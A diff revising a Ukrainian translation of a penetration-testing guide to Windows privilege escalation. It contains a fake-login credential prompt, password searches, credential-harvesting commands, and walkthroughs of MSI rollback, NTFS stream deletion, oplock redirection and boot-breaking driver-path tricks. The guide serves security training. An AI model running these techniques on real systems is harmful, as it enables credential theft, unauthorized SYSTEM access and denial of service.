-Ви завжди можете **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо вважаєте, що він може їх знати (зауважте, що **безпосередньо запитувати** клієнта про **облікові дані** справді **ризиковано**):
+Ви завжди можете **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо вважаєте, що він може їх знати (зауважте, що безпосередньо **запитувати** у клієнта **облікові дані** справді **ризиковано**):
 ```bash
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
@@ -1370,7 +1370,7 @@ $cred.GetNetworkCredential() | fl
 ```
 ### **Можливі імена файлів, що містять облікові дані**
 
-Відомі файли, які свого часу містили **паролі** у **відкритому вигляді** або **Base64**
+Відомі файли, які деякий час тому містили **паролі** у **відкритому тексті** або **Base64**
 ```bash
 $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
 vnc.ini, ultravnc.ini, *vnc*
@@ -1445,9 +1445,9 @@ Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAct
 ```
 ### Облікові дані в Кошику
 
-Також слід перевірити Кошик, щоб знайти в ньому облікові дані
+Також слід перевірити Кошик на наявність облікових даних усередині.
 
-Щоб **відновити паролі**, збережені кількома програмами, можна використати: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)
+Щоб **відновити паролі**, збережені в різних програмах, можна використати: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)
 
 ### У реєстрі
 
@@ -1458,11 +1458,11 @@ reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
 reg query "HKCU\Software\TightVNC\Server"
 reg query "HKCU\Software\OpenSSH\Agent\Key"
 ```
-[**Витягування ключів openssh з реєстру.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
+[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
 ### Історія браузерів
 
-Слід перевірити бази даних, де зберігаються паролі від **Chrome або Firefox**.\
+Слід перевірити бази даних, у яких зберігаються паролі від **Chrome або Firefox**.\
 Також перевірте історію, закладки та вибране браузерів, оскільки там можуть зберігатися **паролі**.
 
 Інструменти для вилучення паролів із браузерів:
@@ -1472,26 +1472,26 @@ reg query "HKCU\Software\OpenSSH\Agent\Key"
 - [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
 - [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)
 
-### **Перезапис COM DLL**
+### **COM DLL Overwriting**
 
-**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка забезпечує **взаємодію** між програмними компонентами, написаними різними мовами. Кожен COM-компонент **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а кожен компонент надає функціональність через один або кілька інтерфейсів, ідентифікованих за допомогою ідентифікаторів інтерфейсів (IID).
+**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка забезпечує **взаємодію** між програмними компонентами, написаними різними мовами. Кожен компонент COM **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а кожен компонент надає функціональність через один або кілька інтерфейсів, ідентифікованих за допомогою ідентифікаторів інтерфейсів (IID).
 
-COM-класи та інтерфейси визначені в реєстрі відповідно в розділах **HKEY\CLASSES\ROOT\CLSID** і **HKEY\CLASSES\ROOT\Interface**. Цей реєстр створюється шляхом об'єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**
+Класи та інтерфейси COM визначені в реєстрі відповідно в **HKEY\CLASSES\ROOT\CLSID** і **HKEY\CLASSES\ROOT\Interface**. Цей реєстр створюється шляхом об'єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**
 
-Усередині CLSID цього реєстру можна знайти дочірній розділ **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, і значення **ThreadingModel**, яке може мати значення **Apartment** (однопотоковий), **Free** (багатопотоковий), **Both** (одно- або багатопотоковий) або **Neutral** (незалежний від потоку).
+Усередині CLSID цього реєстру можна знайти дочірній розділ реєстру **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, і значення **ThreadingModel**, яке може бути **Apartment** (однопотоковий), **Free** (багатопотоковий), **Both** (одно- або багатопотоковий) або **Neutral** (нейтральний до потоків).
 
-![Історія браузерів — перезапис COM DLL: усередині CLSID цього реєстру можна знайти дочірній розділ InProcServer32, який містить значення за замовчуванням, що вказує на DLL, і значення...](<../../images/image (729).png>)
+![Browsers History - COM DLL Overwriting: Усередині CLSID цього реєстру можна знайти дочірній розділ реєстру InProcServer32, який містить значення за замовчуванням, що вказує на DLL, і значення...](<../../images/image (729).png>)
 
-По суті, якщо ви можете **перезаписати будь-яку DLL**, яка буде виконана, ви зможете **підвищити привілеї**, якщо цю DLL буде виконано від імені іншого користувача.
+По суті, якщо ви можете **перезаписати будь-які DLL**, які буде виконано, ви зможете **підвищити привілеї**, якщо цю DLL буде виконано від імені іншого користувача.
 
-Щоб дізнатися, як зловмисники використовують COM Hijacking як механізм persistence, перегляньте:
+Щоб дізнатися, як attackers використовують COM Hijacking як механізм persistence, перегляньте:
 
 
 {{#ref}}
 com-hijacking.md
 {{#endref}}
 
-### **Загальний пошук паролів у файлах і реєстрі**
+### **Пошук паролів у файлах і реєстрі**
 
 **Пошук вмісту файлів**
 ```bash
@@ -1499,7 +1499,7 @@ cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
 findstr /si password *.xml *.ini *.txt *.config
 findstr /spin "password" *.*
 ```
-**Пошук файлу з певною назвою**
+**Пошук файлу з певним ім’ям**
 ```bash
 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 where /R C:\ user.txt
@@ -1514,11 +1514,11 @@ REG QUERY HKCU /F "password" /t REG_SZ /S /d
 ```
 ### Інструменти для пошуку паролів
 
-[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **є плагіном msf**, який я створив для **автоматичного виконання кожного POST-модуля metasploit, що шукає облікові дані** всередині цільової системи.\
+[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **є плагіном msf**; я створив цей плагін для **автоматичного виконання кожного metasploit POST-модуля, який шукає облікові дані** всередині жертви.\
 [**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли, що містять паролі, згадані на цій сторінці.\
-[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для вилучення паролів із системи.
+[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для отримання паролів із системи.
 
-Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сесії**, **імена користувачів** і **паролі** кількох інструментів, які зберігають ці дані у відкритому тексті (PuTTY, WinSCP, FileZilla, SuperPuTTY і RDP)
+Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сесії**, **імена користувачів** і **паролі** кількох інструментів, які зберігають ці дані у відкритому вигляді (PuTTY, WinSCP, FileZilla, SuperPuTTY та RDP)
 ```bash
 Import-Module path\to\SessionGopher.ps1;
 Invoke-SessionGopher -Thorough
@@ -1527,30 +1527,30 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
 ## Leaked Handlers
 
-Уявіть, що **процес, який працює як SYSTEM, відкриває новий процес** (`OpenProcess()`) **із повним доступом**. Цей самий процес **також створює новий процес** (`CreateProcess()`) **із низькими привілеями, але успадковує всі відкриті handles головного процесу**.\
-Тоді, якщо ви маєте **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий handle до привілейованого процесу, створеного** через `OpenProcess()`, і **впровадити shellcode**.\
+Уявіть, що **процес, запущений від імені SYSTEM, відкриває новий процес** (`OpenProcess()`) **з повним доступом**. Цей самий процес **також створює новий процес** (`CreateProcess()`) **з низькими привілеями, але з успадкуванням усіх відкритих handle основного процесу**.\
+Тоді, якщо у вас є **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий handle до привілейованого процесу, створений** за допомогою `OpenProcess()`, і **інжектувати shellcode**.\
 [Прочитайте цей приклад, щоб дізнатися більше про **виявлення та експлуатацію цієї вразливості**.](leaked-handle-exploitation.md)\
-[Прочитайте **іншу публікацію з детальнішим поясненням того, як тестувати та використовувати більше відкритих handlers процесів і потоків, успадкованих із різними рівнями дозволів (не лише з повним доступом)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
+[Прочитайте [**цю іншу публікацію** з повнішим поясненням того, як тестувати та зловживати іншими відкритими handle процесів і потоків, успадкованими з різними рівнями дозволів (не лише з повним доступом)](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
 
 ## Named Pipe Client Impersonation
 
-Сегменти спільної пам'яті, які називають **pipes**, забезпечують взаємодію між процесами та передавання даних.
+Сегменти спільної пам'яті, які називають **pipes**, забезпечують комунікацію між процесами та передавання даних.
 
-Windows надає функцію під назвою **Named Pipes**, яка дозволяє непов'язаним процесам обмінюватися даними, зокрема через різні мережі. Це нагадує архітектуру клієнт/сервер, у якій ролі визначаються як **named pipe server** і **named pipe client**.
+Windows надає функцію під назвою **Named Pipes**, яка дозволяє незв'язаним процесам обмінюватися даними, навіть через різні мережі. Це нагадує client/server architecture, де ролі визначаються як **named pipe server** і **named pipe client**.
 
-Коли **client** надсилає дані через pipe, **server**, який налаштував pipe, може **перейняти ідентичність** **client**, якщо має необхідні права **SeImpersonate**. Виявлення **привілейованого процесу**, який взаємодіє через pipe, який ви можете імітувати, створює можливість **отримати вищі привілеї**, перейнявши ідентичність цього процесу після його взаємодії зі створеним вами pipe. Інструкції щодо виконання такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).
+Коли **client** надсилає дані через pipe, **server**, який налаштував pipe, може **перейняти ідентичність** **client**, якщо має необхідні права **SeImpersonate**. Виявлення **привілейованого процесу**, який взаємодіє через pipe, що ви можете імітувати, створює можливість **отримати вищі привілеї**, перейнявши ідентичність цього процесу після його взаємодії зі створеним вами pipe. Інструкції щодо виконання такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).
 
-Також наведений нижче tool дозволяє **перехоплювати взаємодію через named pipe за допомогою tool на кшталт burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **а цей tool дозволяє перелічувати та переглядати всі pipes для пошуку privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
+Також наведений нижче інструмент дозволяє **перехоплювати комунікацію named pipe за допомогою такого інструмента, як burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **а цей інструмент дозволяє переглядати список усіх pipes, щоб знаходити privescs:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
 
 ## Telephony tapsrv remote DWORD write to RCE
 
-Служба Telephony (TapiSrv) у режимі сервера відкриває `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований client може використати асинхронний event path на основі mailslot, щоб перетворити `ClientAttach` на довільний **4-byte запис** у будь-який наявний файл, доступний для запису користувачу `NETWORK SERVICE`, після чого отримати права адміністратора Telephony та завантажити довільну DLL як служба. Повний flow:
+Сервіс Telephony (TapiSrv) у режимі сервера відкриває `\\pipe\\tapsrv` (MS-TRP). Віддалений authenticated client може зловжити асинхронним шляхом подій на основі mailslot, щоб перетворити `ClientAttach` на довільний **4-byte запис** у будь-який наявний файл, доступний для запису користувачу `NETWORK SERVICE`, після чого отримати права адміністратора Telephony та завантажити довільну DLL як сервіс. Повний flow:
 
-- `ClientAttach` із `pszDomainUser`, встановленим у наявний path, доступний для запису → service відкриває його через `CreateFileW(..., OPEN_EXISTING)` і використовує для асинхронного запису events.
-- Кожна подія записує контрольований attacker'ом `InitContext` із `Initialize` у цей handle. Зареєструйте line app через `LRegisterRequestRecipient` (`Req_Func 61`), викличте `TRequestMakeCall` (`Req_Func 121`), отримайте дані через `GetAsyncEvents` (`Req_Func 0)`), а потім скасуйте реєстрацію/завершіть роботу, щоб повторювати детерміновані записи.
-- Додайте себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, повторно підключіться, а потім викличте `GetUIDllName` із довільним шляхом до DLL, щоб виконати `TSPI_providerUIIdentify` як `NETWORK SERVICE`.
+- `ClientAttach` із `pszDomainUser`, встановленим у наявний шлях, доступний для запису → сервіс відкриває його через `CreateFileW(..., OPEN_EXISTING)` і використовує для асинхронного запису подій.
+- Кожна подія записує контрольований атакувальником `InitContext` з `Initialize` у цей handle. Зареєструйте line app за допомогою `LRegisterRequestRecipient` (`Req_Func 61`), викличте `TRequestMakeCall` (`Req_Func 121`), отримайте дані через `GetAsyncEvents` (`Req_Func 0`), а потім скасуйте реєстрацію/завершіть роботу, щоб повторювати детерміновані записи.
+- Додайте себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, повторно підключіться, а потім викличте `GetUIDllName` із довільним шляхом до DLL, щоб виконати `TSPI_providerUIIdentify` від імені `NETWORK SERVICE`.
 
-Детальніше:
+Докладніше:
 
 {{#ref}}
 telephony-tapsrv-arbitrary-dword-write-to-rce.md
@@ -1562,9 +1562,9 @@ telephony-tapsrv-arbitrary-dword-write-to-rce.md
 
 Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**
 
-### Зловживання Protocol handler / ShellExecute через Markdown renderers
+### Зловживання protocol handler / ShellExecute через Markdown renderers
 
-Клікабельні Markdown links, передані до `ShellExecuteExW`, можуть активувати небезпечні URI handlers (`file:`, `ms-appinstaller:` або будь-яку зареєстровану scheme) і виконати контрольовані attacker'ом файли від імені поточного користувача. Дивіться:
+Клікабельні Markdown-посилання, передані до `ShellExecuteExW`, можуть запускати небезпечні URI handlers (`file:`, `ms-appinstaller:` або будь-яку зареєстровану схему) і виконувати контрольовані атакувальником файли від імені поточного користувача. Дивіться:
 
 {{#ref}}
 ../protocol-handler-shell-execute-abuse.md
@@ -1572,7 +1572,7 @@ telephony-tapsrv-arbitrary-dword-write-to-rce.md
 
 ### **Моніторинг командних рядків на наявність паролів**
 
-Під час отримання shell від імені користувача можуть виконуватися scheduled tasks або інші процеси, які **передають облікові дані в командному рядку**. Наведений нижче script кожні дві секунди перехоплює командні рядки процесів і порівнює поточний стан із попереднім, виводячи всі відмінності.
+Під час отримання shell від імені користувача можуть виконуватися scheduled tasks або інші процеси, які **передають облікові дані в командному рядку**. Наведений нижче скрипт кожні дві секунди знімає командні рядки процесів і порівнює поточний стан із попереднім, виводячи всі відмінності.
 ```bash
 while($true)
 {
@@ -1582,15 +1582,15 @@ $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
 Compare-Object -ReferenceObject $process -DifferenceObject $process2
 }
 ```
-## Викрадення паролів із процесів
+## Крадіжка паролів із процесів
 
-## Від користувача з низькими привілеями до NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass
+## Від користувача з низькими привілеями до NT\AUTHORITY SYSTEM (CVE-2019-1388) / Обхід UAC
 
-Якщо ви маєте доступ до графічного інтерфейсу (через консоль або RDP), а UAC увімкнено, у деяких версіях Microsoft Windows можна запустити термінал або будь-який інший процес від імені "NT\AUTHORITY SYSTEM" із непривілейованого користувача.
+Якщо ви маєте доступ до графічного інтерфейсу (через консоль або RDP), а UAC увімкнено, у деяких версіях Microsoft Windows можна запустити термінал або будь-який інший процес, наприклад від імені "NT\AUTHORITY SYSTEM", з непривілейованого користувача.
 
-Це дає змогу одночасно підвищити привілеї та обійти UAC, використовуючи ту саму вразливість. Крім того, немає потреби щось інсталювати, а бінарний файл, який використовується під час цього процесу, підписаний і виданий Microsoft.
+Це дає змогу одночасно підвищити привілеї та обійти UAC, використовуючи ту саму вразливість. Крім того, немає потреби щось інсталювати, а бінарний файл, використаний під час процесу, підписаний і виданий Microsoft.
 
-Серед уражених систем є такі:
+Нижче наведено деякі з уражених систем:
 ```
 SERVER
 ======
@@ -1630,16 +1630,20 @@ Windows 10 1709	16299	link NOT opened
 
 8) Remember to cancel setup and the UAC prompt to return to your desktop.
 ```
-## Від середнього рівня цілісності Administrator до високого рівня цілісності / UAC Bypass
+Ви маєте всі необхідні файли та інформацію в цьому GitHub repository:
 
-Прочитайте це, щоб **дізнатися про рівні цілісності**:
+https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>
+
+## Від Administrator Medium до High Integrity Level / UAC Bypass
+
+Прочитайте це, щоб **дізнатися про Integrity Levels**:
 
 
 {{#ref}}
 integrity-levels.md
 {{#endref}}
 
-Потім **прочитайте це, щоб дізнатися про UAC та UAC bypasses:**
+Потім **прочитайте це, щоб дізнатися про UAC і UAC bypasses:**
 
 
 {{#ref}}
@@ -1648,116 +1652,116 @@ integrity-levels.md
 
 ## Від довільного видалення/переміщення/перейменування папки до SYSTEM EoP
 
-Техніка, описана [**у цьому blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), з exploit code, [**доступним тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).
+Техніка, описана [**у цьому blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), з exploit code, [**доступним тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>
 
-Атака загалом полягає у зловживанні функцією відкату Windows Installer для заміни легітимних файлів шкідливими під час процесу деінсталяції. Для цього атакувальнику потрібно створити **шкідливий MSI installer**, який використовуватиметься для перехоплення папки `C:\Config.Msi`. Пізніше Windows Installer використовуватиме її для зберігання rollback-файлів під час деінсталяції інших MSI packages, причому rollback-файли буде змінено так, щоб вони містили шкідливе payload.
+Атака фактично полягає у зловживанні функцією відкату Windows Installer для заміни легітимних файлів malicious-файлами під час процесу видалення. Для цього атакувальнику потрібно створити **malicious MSI installer**, який використовуватиметься для hijack папки `C:\Config.Msi`. Пізніше Windows Installer використовуватиме її для зберігання rollback-файлів під час видалення інших MSI-пакетів, причому rollback-файли буде змінено так, щоб вони містили malicious payload.
 
-Узагальнено техніка виглядає так:
+Стисло техніка виглядає так:
 
-1. **Етап 1 – Підготовка до перехоплення (залишити `C:\Config.Msi` порожньою)**
+1. **Етап 1 – Підготовка до hijack (залишити `C:\Config.Msi` порожньою)**
 
 - Крок 1: Install the MSI
-- Створіть `.msi`, який встановлює нешкідливий файл (наприклад, `dummy.txt`) у папку, доступну для запису (`TARGETDIR`).
-- Позначте installer як **"UAC Compliant"**, щоб його міг запустити **non-admin user**.
-- Залиште **handle** відкритим для файлу після встановлення.
+- Створіть `.msi`, який встановлює нешкідливий файл (наприклад, `dummy.txt`) у доступну для запису папку (`TARGETDIR`).
+- Позначте installer як **"UAC Compliant"**, щоб його міг запустити **не-адміністратор**.
+- Залиште **відкритим handle** до файлу після встановлення.
 
 - Крок 2: Begin Uninstall
 - Видаліть той самий `.msi`.
-- Процес деінсталяції починає переміщувати файли до `C:\Config.Msi` і перейменовувати їх на `.rbf` files (rollback backups).
-- **Опитуйте відкритий file handle** за допомогою `GetFinalPathNameByHandle`, щоб виявити, коли файл стане `C:\Config.Msi\<random>.rbf`.
+- Процес видалення починає переміщувати файли до `C:\Config.Msi` і перейменовувати їх на `.rbf`-файли (rollback backups).
+- **Опитуйте відкритий handle до файлу** за допомогою `GetFinalPathNameByHandle`, щоб виявити момент, коли файл стане `C:\Config.Msi\<random>.rbf`.
 
 - Крок 3: Custom Syncing
 - `.msi` містить **custom uninstall action (`SyncOnRbfWritten`)**, яка:
-- Сигналізує, коли `.rbf` було записано.
-- Потім **очікує** на іншу event перед продовженням деінсталяції.
+- Сигналізує, коли `.rbf` записано.
+- Потім **очікує** на іншу подію перед продовженням видалення.
 
 - Крок 4: Block Deletion of `.rbf`
-- Після отримання сигналу **відкрийте `.rbf` file** без `FILE_SHARE_DELETE` — це **запобігає його видаленню**.
-- Потім **подайте сигнал у відповідь**, щоб деінсталяція могла завершитися.
-- Windows Installer не може видалити `.rbf`, а оскільки він не може видалити весь вміст, `C:\Config.Msi` не видаляється.
+- Після отримання сигналу **відкрийте `.rbf`-файл** без `FILE_SHARE_DELETE` — це **перешкоджає його видаленню**.
+- Потім **надішліть сигнал у відповідь**, щоб видалення могло завершитися.
+- Windows Installer не вдається видалити `.rbf`, і оскільки він не може видалити весь вміст, `C:\Config.Msi` **не видаляється**.
 
 - Крок 5: Manually Delete `.rbf`
-- Ви (атакувальник) вручну видаляєте `.rbf file`.
-- Тепер **`C:\Config.Msi` порожня**, і її можна перехопити.
+- Ви (атакувальник) вручну видаляєте `.rbf`-файл.
+- Тепер **`C:\Config.Msi` порожня** й готова до hijack.
 
-> На цьому етапі **активуйте вразливість довільного видалення папки на рівні SYSTEM**, щоб видалити `C:\Config.Msi`.
+> На цьому етапі **активуйте vulnerability довільного видалення папки на рівні SYSTEM**, щоб видалити `C:\Config.Msi`.
 
-2. **Етап 2 – Заміна Rollback Scripts на шкідливі**
+2. **Етап 2 – Заміна rollback-скриптів на malicious-скрипти**
 
 - Крок 6: Recreate `C:\Config.Msi` with Weak ACLs
-- Самостійно відтворіть папку `C:\Config.Msi`.
-- Встановіть **weak DACLs** (наприклад, Everyone:F) і **залиште handle відкритим** із `WRITE_DAC`.
+- Створіть папку `C:\Config.Msi` знову самостійно.
+- Встановіть **weak DACLs** (наприклад, Everyone:F) і **залиште відкритим handle** з `WRITE_DAC`.
 
 - Крок 7: Run Another Install
-- Встановіть `.msi` ще раз із такими параметрами:
-- `TARGETDIR`: Writable location.
-- `ERROROUT`: Змінна, яка запускає примусовий збій.
+- Знову встановіть `.msi` із такими параметрами:
+- `TARGETDIR`: доступне для запису розташування.
+- `ERROROUT`: змінна, яка запускає примусовий збій.
 - Це встановлення використовуватиметься для повторного запуску **rollback**, який читає `.rbs` і `.rbf`.
 
 - Крок 8: Monitor for `.rbs`
 - Використовуйте `ReadDirectoryChangesW` для моніторингу `C:\Config.Msi`, доки не з’явиться новий `.rbs`.
-- Збережіть його filename.
+- Збережіть його ім’я файлу.
 
 - Крок 9: Sync Before Rollback
 - `.msi` містить **custom install action (`SyncBeforeRollback`)**, яка:
-- Сигналізує event, коли створено `.rbs`.
+- Сигналізує подію, коли створено `.rbs`.
 - Потім **очікує** перед продовженням.
 
 - Крок 10: Reapply Weak ACL
-- Після отримання event `.rbs created`:
+- Після отримання події `.rbs created`:
 - Windows Installer **повторно застосовує strong ACLs** до `C:\Config.Msi`.
-- Але оскільки у вас усе ще є handle із `WRITE_DAC`, ви можете **знову застосувати weak ACLs**.
+- Але оскільки ви все ще маєте handle з `WRITE_DAC`, ви можете **знову застосувати weak ACLs**.
 
-> ACLs **перевіряються лише під час відкриття handle**, тому ви все ще можете записувати до папки.
+> **ACLs перевіряються лише під час відкриття handle**, тому ви все ще можете записувати до папки.
 
 - Крок 11: Drop Fake `.rbs` and `.rbf`
-- Перезапишіть `.rbs` file за допомогою **fake rollback script**, який вказує Windows:
-- Відновити ваш `.rbf file` (malicious DLL) у **privileged location** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
-- Розмістіть ваш fake `.rbf`, який містить **malicious SYSTEM-level payload DLL**.
+- Перезапишіть файл `.rbs` **fake rollback script**, який повідомляє Windows:
+- Відновити ваш `.rbf`-файл (malicious DLL) у **привілейоване розташування** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
+- Розмістіть ваш fake `.rbf`, що містить **malicious SYSTEM-level payload DLL**.
 
 - Крок 12: Trigger the Rollback
-- Подайте сигнал sync event, щоб installer продовжив роботу.
-- **type 19 custom action (`ErrorOut`)** налаштовано так, щоб **навмисно завершити встановлення з помилкою** у відомій точці.
+- Надішліть сигнал події синхронізації, щоб installer продовжив роботу.
+- **type 19 custom action (`ErrorOut`)** налаштовано для **навмисного збою встановлення** у відомій точці.
 - Це спричиняє **початок rollback**.
 
 - Крок 13: SYSTEM Installs Your DLL
 - Windows Installer:
-- Читає ваш шкідливий `.rbs`.
-- Копіює ваш `.rbf` DLL у target location.
-- Тепер у вас є **malicious DLL у SYSTEM-loaded path**.
+- Читає ваш malicious `.rbs`.
+- Копіює DLL із `.rbf` у цільове розташування.
+- Тепер у вас є **malicious DLL у шляху, який завантажується SYSTEM**.
 
 - Final Step: Execute SYSTEM Code
-- Запустіть довірений **auto-elevated binary** (наприклад, `osk.exe`), який завантажує перехоплену DLL.
-- **Boom**: Ваш code виконується **як SYSTEM**.
+- Запустіть довірений **auto-elevated binary** (наприклад, `osk.exe`), який завантажує DLL, яку ви hijack-нули.
+- **Boom**: ваш код виконується **як SYSTEM**.
 
 
 ### Від довільного видалення/переміщення/перейменування файлу до SYSTEM EoP
 
-Основна техніка MSI rollback (попередня) передбачає можливість видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що робити, якщо ваша вразливість дозволяє лише **довільне видалення файлів**?
+Основна MSI rollback technique (попередня) передбачає можливість видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що, якщо ваша vulnerability дозволяє лише **довільне видалення файлів**?
 
-Ви можете використати **внутрішні механізми NTFS**: кожна папка має прихований alternate data stream із назвою:
+Ви можете скористатися **внутрішніми механізмами NTFS**: кожна папка має прихований alternate data stream із назвою:
 ```
 C:\SomeFolder::$INDEX_ALLOCATION
 ```
 Цей потік зберігає **метадані індексу** папки.
 
-Отже, якщо **видалити потік `::$INDEX_ALLOCATION`** папки, NTFS **видаляє всю папку** з файлової системи.
+Тому, якщо ви **видалите потік `::$INDEX_ALLOCATION`** папки, NTFS **видалить усю папку** з файлової системи.
 
 Це можна зробити за допомогою стандартних API для видалення файлів, наприклад:
 ```c
 DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
 ```
-> Навіть якщо ви викликаєте API видалення *файлу*, він **видаляє саму папку**.
+> Навіть якщо ви викликаєте API видалення *файлу*, воно **видаляє саму папку**.
 
 ### Від видалення вмісту папки до SYSTEM EoP
-Що робити, якщо ваш примітив не дозволяє видаляти довільні файли/папки, але **дозволяє видаляти *вміст* папки, контрольованої атакером**?
+Що робити, якщо ваш примітив не дозволяє видаляти довільні файли/папки, але **дозволяє видаляти *вміст* папки, контрольованої атакувальником**?
 
-1. Крок 1: Налаштуйте папку-пастку та файл
+1. Крок 1: Налаштуйте приманкову папку та файл
 - Створіть: `C:\temp\folder1`
 - Усередині неї: `C:\temp\folder1\file1.txt`
 
 2. Крок 2: Встановіть **oplock** на `file1.txt`
-- oplock **призупиняє виконання**, коли привілейований процес намагається видалити `file1.txt`.
+- Oplock **призупиняє виконання**, коли привілейований процес намагається видалити `file1.txt`.
 ```c
 // pseudo-code
 RequestOplock("C:\\temp\\folder1\\file1.txt");
@@ -1765,9 +1769,9 @@ WaitForDeleteToTriggerOplock();
 ```
 3. Крок 3: Запустіть процес SYSTEM (наприклад, `SilentCleanup`)
 - Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
-- Коли він досягає `file1.txt`, спрацьовує **oplock** і передає керування вашому callback.
+- Коли він досягає `file1.txt`, **oplock triggers** і передає керування вашому callback.
 
-4. Крок 4: Усередині callback oplock — перенаправлення видалення
+4. Крок 4: Усередині callback oplock — перенаправте видалення
 
 - Варіант A: Перемістіть `file1.txt` в інше місце
 - Це спорожнює `folder1`, не порушуючи oplock.
@@ -1778,16 +1782,16 @@ WaitForDeleteToTriggerOplock();
 # folder1 is now a junction to \RPC Control (non-filesystem namespace)
 mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
 ```
-- Варіант C: Створити **symlink** у `\RPC Control`:
+- Варіант C: Створіть **symlink** у `\RPC Control`:
 ```bash
 # Make file1.txt point to a sensitive folder stream
 CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
 ```
-> Це націлено на внутрішній потік NTFS, у якому зберігаються метадані папки, — його видалення видаляє папку.
+> Це націлено на внутрішній потік NTFS, у якому зберігаються метадані папки — його видалення видаляє папку.
 
 5. Крок 5: Звільнення oplock
 - Процес SYSTEM продовжує роботу та намагається видалити `file1.txt`.
-- Але тепер через junction + symlink насправді видаляється:
+- Але тепер через junction + symlink фактично видаляється:
 ```
 C:\Config.Msi::$INDEX_ALLOCATION
 ```
@@ -1797,56 +1801,56 @@ C:\Config.Msi::$INDEX_ALLOCATION
 
 Використайте примітив, який дає змогу **створити довільну папку від імені SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі дозволи**.
 
-Створіть **папку** (не файл) з назвою **критичного драйвера Windows**, наприклад:
+Створіть **папку** (не файл) з іменем **критичного драйвера Windows**, наприклад:
 ```
 C:\Windows\System32\cng.sys
 ```
 - Цей шлях зазвичай відповідає kernel-mode driver `cng.sys`.
-- Якщо **заздалегідь створити його як папку**, Windows не зможе завантажити фактичний driver під час boot.
+- Якщо **заздалегідь створити його як папку**, Windows не зможе завантажити справжній driver під час boot.
 - Потім Windows намагається завантажити `cng.sys` під час boot.
-- Він бачить папку, **не може визначити фактичний driver** і **призводить до збою або зупинки boot**.
